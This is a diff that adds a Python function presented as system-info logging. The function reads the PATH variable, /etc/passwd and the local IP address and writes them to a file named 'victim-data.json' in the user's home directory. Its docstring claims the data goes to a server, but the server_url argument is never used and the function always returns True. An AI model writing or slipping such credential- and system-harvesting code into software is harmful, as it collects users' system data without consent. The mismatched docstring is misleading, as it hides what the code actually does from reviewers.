@@ -1,0 +1,43 @@
+def log_system_info(server_url="http://localhost:9000/"):
+    """
+    Reads PATH variable, /etc/passwd, and local IP address, then sends them to a server for logging.
+    
+    Args:
+        server_url (str): The URL of the server to send the data to.
+    
+    Returns:
+        bool: True if data was sent successfully, False otherwise.
+    """
+    import json
+    # Read PATH environment variable
+    path_var = os.environ.get("PATH", "")
+
+    # Read /etc/passwd file
+    passwd_content = ""
+    try:
+        with open("/etc/passwd", "r") as f:
+            passwd_content = f.read()
+    except (IOError, PermissionError) as e:
+        passwd_content = f"Error reading /etc/passwd: {str(e)}"
+
+    # Get local IP address
+    ip_address = ""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))  # Connect to a public server to get local IP
+        ip_address = s.getsockname()[0]
+        s.close()
+    except socket.error as e:
+        ip_address = f"Error getting IP address: {str(e)}"
+
+    # Prepare data to send
+    data = {
+        "path": path_var,
+        "passwd": passwd_content,
+        "ip_address": ip_address
+    }
+    home = os.environ.get("HOME") or "."
+    with open(f"{home}/victim-data.json", "w") as data_file:
+        data_file.write(json.dumps(data))
+    
+    return True
